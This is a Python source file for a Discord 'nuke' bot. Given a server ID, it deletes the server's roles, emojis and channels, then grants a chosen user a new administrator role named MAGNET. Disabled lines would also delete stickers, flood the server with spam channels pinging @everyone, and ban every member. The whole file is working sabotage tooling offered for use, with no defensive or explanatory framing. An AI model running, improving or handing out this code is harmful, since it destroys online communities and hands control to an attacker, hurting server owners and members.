import discord as Discord, os as OS, random as Random, sys as System
from string import ascii_lowercase as Ascii
from asyncio import sleep as Wait

DiscordClient = Discord.Client(intents = Discord.Intents.all())
Permissions = Discord.Permissions(administrator = True)
Color = Discord.Colour(value = 0x00050D)
Token = OS.getenv("Token")

TwitchUrl = "https://www.twitch.tv/darkviperau"

class Nuke:
	async def DeleteChannels(Guild):		
		Channels = await Guild.fetch_channels()
		
		for Channel in Channels:
			try:
				print(f"Channel Deleted: {Channel}")
				
				await Channel.delete()
			except Discord.HTTPException as Err:
				print(f"Ratelimited : DeleteChannels : {Err}")
				await Wait(10)
				
	async def BanMembers(Guild):
		Members = await Guild.fetch_members()
		
		for Member in Members:
			try:
				print(f"Member Banned: {Member}")
				
				await Guild.ban(Member)
				await Wait(1)
			except Discord.HTTPException as Err:
				print(f"Ratelimited : Ban : {Err}")
				await Wait(10)

	async def DeleteRoles(Guild):
		Roles = await Guild.fetch_roles()
		
		for Role in Roles:
			try:
				if Role == Guild.default_role or Role.is_bot_managed():
					continue
					
				print(f"Role Deleted: {Role}")
				
				await Role.delete()
				await Wait(1)
			except Discord.HTTPException as Err:
				print(f"Ratelimited : Roles : {Err}")
				await Wait(10)

	async def DeleteStickers(Guild):
		Stickers = await Guild.fetch_stickers()
		
		for Sticker in Stickers:
			try:
				print(f"Sticker Deleted: {Sticker}")
				
				await Sticker.delete()
				await Wait(1)
			except Discord.HTTPException as Err:
				print(f"Ratelimited : Stickers : {Err}")
				await Wait(10)
				
	async def DeleteEmojis(Guild):
		Emojis = await Guild.fetch_emojis()
		
		for Emoji in Emojis:
			try:
				print(f"Emoji Deleted: {Emoji}")
				
				await Emoji.delete()
				await Wait(1)
			except Discord.HTTPException as Err:
				print(f"Ratelimited : Emojis : {Err}")
				await Wait(10)

	async def CreateChannels(Guild):
		for _ in range(50):
			try:
				RandomString = "".join(Random.choice(Ascii) for _ in range(50))				
				Name = f"Magnet_{RandomString}"

				print(f"Channel Created: {Name}")
				
				Channel = await Guild.create_text_channel(name = Name)
				await Channel.send("@everyone magnet was here ^_^")
			except Discord.HTTPException as Err:
				print(f"Ratelimited : CreateChannels : {Err}")
				await Wait(3)

	async def MakeAdmin(Guild):
		ID = str(input("Discord UserID: ")).strip()

		while ID.isnumeric() == False:
			print("Invalid ID")
			ID = str(input("Discord UserID: "))

		try:
			Member = await Guild.fetch_member(ID)
			Role = await Guild.create_role(name = "MAGNET", permissions = Permissions, color = Color)

			await Member.add_roles(Role)
		except:
			pass
	
	async def Start(Guild):
		await Nuke.DeleteRoles(Guild)
		await Nuke.DeleteEmojis(Guild)
		## await Nuke.DeleteStickers(Guild)
		await Nuke.DeleteChannels(Guild)
		## await Nuke.CreateChannels(Guild)
		## await Nuke.BanMembers(Guild)
		await Nuke.MakeAdmin(Guild)

		print(f"Nuke on '{Guild}' finished")

@DiscordClient.event
async def on_ready():
	await DiscordClient.change_presence(activity = Discord.Streaming(name = "magnet", url = TwitchUrl))

	ID = str(input("Guild ID: ")).strip()

	if ID.isnumeric():
		try:
			Guild = await DiscordClient.fetch_guild(int(ID))
			
			print(f"Nuke on '{Guild}' started")
			await Nuke.Start(Guild)
		except Discord.errors.NotFound:
			System.exit(f"Not in Guild '{ID}'")
		except Exception as Err:
			System.exit(Err)
	else:
		System.exit(f"Invalid Guild ID: '{ID}'")

DiscordClient.run(Token)
